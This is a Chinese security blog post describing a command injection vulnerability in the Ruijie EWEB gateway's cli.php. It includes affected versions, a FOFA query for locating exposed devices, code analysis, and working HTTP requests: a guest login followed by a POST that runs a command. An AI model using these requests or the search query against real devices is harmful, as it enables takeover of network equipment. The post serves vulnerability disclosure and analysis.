---
title: "锐捷-EWEB cli.php 命令注入漏洞"
source: https://mrxn.net/jswz/ruijieweb-cli-rce.html
asset_dir: assets/锐捷-eweb-cli.php-命令注入漏洞
---

# 锐捷-EWEB cli.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/2 08:25
- 840浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

网络安全会议

安全工具开发

数据库

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `cli.php` 的 `indexAction`存在[命令注入](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)在设备上执行任意命令，造成设备失陷等高危风险。

代码安全审计

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `cli.php` 关键业务 `indexAction` 逻辑的实现

深入探索

物流软件安全

传输层安全性协议

计算机安全

```
public function indexAction() {
        $mode = p("mode_url");
        $command = p("command");
        $answer = p("answer");

        if ($mode == false)
            $mode = "exec";
        if ($answer == false)
            $answer = "";
        if ($command !== false)
            $command = iconv('UTF-8', 'GBK//IGNORE', $command);
        $data = execCli($mode, $command, $answer);
        if ($data["status"] !== 1) {
            json_echo($data);
            exit();
        }
```

深入探索

漏洞预警服务

Windows安全工具

Nessus

`mode_url` 、`command` 和 `answer` 带入 `execCli` 方法中，跟进看下其实现

漏洞扫描服务

```
function execCli($mode = "exec", $command = "", $answer = "") {
    $data = [];
    if ($command == "" || $command == false) {
        $data["status"] = 2;
        $data["msg"] = "no command";
        return $data;
    }
    if (!function_exists('php_exec_cli')) {  //动态加载cli通信模块
        if (!@dl('client.so')) {
            $data["status"] = 3;
            $data["msg"] = "can't load client.so";
            return $data;
        }
    }
    if (defined('DEBUG') && DEBUG) {
        $t1 = microtime(true);
    }
    $data["data"] = php_exec_cli($command, $mode, $answer);
    $data["status"] = 1;
    if (defined('DEBUG') && DEBUG) {
        $t2 = microtime(true);
        $data["executeTime"] = ($t2 - $t1) * 1000;
    }
    return $data;
}
```

根据 `$command` 是否为空，然后来调用 `php_exec_cli` 执行命令，全程无过滤和检测，因此造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB cli.php 命令注入漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 命令注入

```
POST /cli.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

command=dir&mode_url=0
```

[![锐捷-EWEB cli.php 命令注入漏洞](images/img-002-1b0bd90b140e.webp)](https://image.mrxn.net/2f1e3d9c57184b01bf47eac923e77a3b.webp)

成功执行 `dir` 命令并回显结果。

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.获取cookie](#toc-5-1-)
- [5.2.命令注入](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
